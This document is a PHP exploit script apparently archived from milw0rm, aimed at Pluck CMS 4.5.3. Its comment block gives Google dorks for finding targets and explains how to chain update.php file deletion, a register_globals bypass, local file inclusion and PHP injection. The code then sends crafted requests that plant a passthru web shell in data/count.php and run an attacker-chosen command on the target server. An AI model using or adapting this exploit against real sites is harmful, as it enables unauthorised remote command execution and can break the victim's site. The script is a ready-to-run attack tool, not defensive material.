<?php
        /*

         Pluck 4.5.3 update.php remote file corruption exploit
         by Nine:Situations:Group::bookoo
         our site: http://retrogod.altervista.org/
   
         Google dorks: "powered by pluck" +admin 
                       inurl:file=kop1.php
                       inurl:file=kop2.php
                       ...
                  
         Exploit condition : register_globals = on
         Note(!): regardless of php.ini settings, this code will turn your host in a blank page ...


         Vulnerability:
         this program carries a dangerous update.php script. If reachable
         in the main folder, you can delete the files with language and theme preferences:

         ...
         $step = $_GET['step'];
         ...

         ...
         elseif($step == "3") {

         echo "Rearranging files for compatibility with pluck 4.5...<br>";

         copy("data/title.dat", "data/settings/title.dat");

         unlink("data/settings/install.dat");
         copy("data/install.dat", "data/settings/install.dat");

         copy("data/options.php", "data/settings/options.php");

         copy("data/pass.php", "data/settings/pass.php");

         unlink("data/settings/langpref.php");
         copy("data/inc/lang/langpref.php", "data/settings/langpref.php");

         unlink("data/settings/themepref.php");
         copy("data/inc/themes/themepref.php", "data/settings/themepref.php");
         ...

         see the unlink() calls... the subsequent copy() has no results if you
         don't place the source files there...

         Now look at index.php, lines 21-26:
         
         ...
         //Include security-enhancements
         include ("data/inc/security.php");
         //Include Translation data
         include ("data/settings/langpref.php");
         include ("data/inc/lang/en.php");
         include ("data/inc/lang/$langpref");
         ...

         The script now fails to include the langpref.php script and "langpref" variable is not initialized then,
         ***if register_globals=on*** you can include arbitraty files from local resources.
        
         This check in security.php doesn't work as expected :
         ... 
         //Register Globals
         //If Register Globals are ON, unset injected variables
         if(isset($_REQUEST)) {
	   foreach ($_REQUEST as $key => $value) { 
		if(isset($GLOBALS[$key])) {
			unset($GLOBALS[$key]); 
		    }
	      }
         }
         ...
         ex: http://host/path/index.php?GLOBALS[langpref]=1

         It unsets the "GLOBALS" key from the GLOBALS[] array, while langpref variable remains
         overwritten...

         You can include the /data/inc/page_editmeta.php script which contains a nice php injection:

         ...
         if(isset($_POST['Submit'])) {
         $data = "data/content/$editmeta";
         include("data/inc/page_stripslashes.php");
         $file = fopen($data, "w");  
         fputs($file, "<?php 
         \$title = \"$title\";
         \$content = \"$content\";
         \$contactinc = \"$contactinc\";
         \$hidden = \"$hidden\";
         \$description = \"$cont1\";
         \$keywords = \"$sleutel\";
         \$copyright = \"$copyr\";");
         //Check if we also need to include albums
         if ($incalbum) {
         foreach ($incalbum as $name => $value) {
         fputs($file, "\n\$incalbum['$name'] = \"yes\";");
         } }
         //Check if we also need to include blogs
         if ($incblog) {
         foreach ($incblog as $name => $value) {
         fputs($file, "\n\$incblog['$name'] = \"yes\";");
         } }
         fputs($file, "\n ?>");
         fclose($file); 
         ...

         also this check in /data/inc/page_editmeta.php is unuseful because
         you call it from the main script:
         
         ...
         //Make sure the file isn't accessed directly
         if((!ereg("index.php", $_SERVER['SCRIPT_FILENAME'])) && (!ereg("admin.php", $_SERVER['SCRIPT_FILENAME'])) && (!ereg("install.php", $_SERVER['SCRIPT_FILENAME'])) && (!ereg("login.php", $_SERVER['SCRIPT_FILENAME']))){
         //Give out an "access denied" error
         echo "access denied";
         //Block all other code
         exit();
         }
         ...

         We choose the /data/count.php to inject a php shell then you can launch commands on the target server.
                
         
        */

        $cmd = "uname";//change here
        
        error_reporting(7);
        $host=$argv[1];
        $path=$argv[2];
        $argv[3] ? $port = (int) $argv[3] : $port = 80;
        $argv[2] ? print("attackin'...\n") : die ("syntax: php ".$argv[0]." [host] [path] [[port]]");

        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
        $win ? dl("php_curl.dll") : dl("php_curl.so");

        $url = "http://$host:$port";
     
        function send($url,$header)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL,$url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 0);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $header);

            $data = curl_exec($ch); if (curl_errno($ch)) {
            print curl_error($ch)."\n";
            } else {
               curl_close($ch);
            }
            sleep(1);
            return $data."\n";
            
        }

        $agent = "Mozilla</b>/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)";

        $header ="GET ".$path."update.php?step=3 HTTP/1.0\r\n";
        $header.="Host: $host\r\nUser-Agent: $agent\r\nConnection: Close\r\n\r\n";
        send($url,$header);

        //oh, how evil... tested and working against PHP 5.2.4
        $header ="POST ".$path."index.php HTTP/1.0\r\n";
        $header.="Host: $host\r\nUser-Agent: $agent\r\n";
        $header.="Content-Type: application/x-www-form-urlencoded\r\n";
        $header.="Content-Length: 218\r\n";
        $header.="Connection: Close\r\n\r\n";
        $header.="Submit=1&GLOBALS[langpref]=../page_editmeta.php&GLOBALS[editmeta]=../count.php&GLOBALS[sleutel]=\$x{\$y{error_reporting(0)}}\$x{\$y{set_time_limit(0)}}\$x{\$y{print(my_flag)}}\$x{\$y{passthru(\$_SERVER[HTTP_CMD])}}\$x{\$y{die()}}";
        send($url,$header);

        $header ="GET ".$path."data/count.php HTTP/1.0\r\n";
        $header.="Host: $host\r\nUser-Agent: $agent\r\n";
        $header.="CMD: $cmd\r\n";
        $header.="Connection: Close\r\n\r\n";
        $out=send($url,$header);
        $out=explode("my_flag",$out);
        count($out)==2 ? print("exploit succeeded...\n$out[1]") : print("exploit failed... :(\n");
?>

# milw0rm.com [2008-09-19]
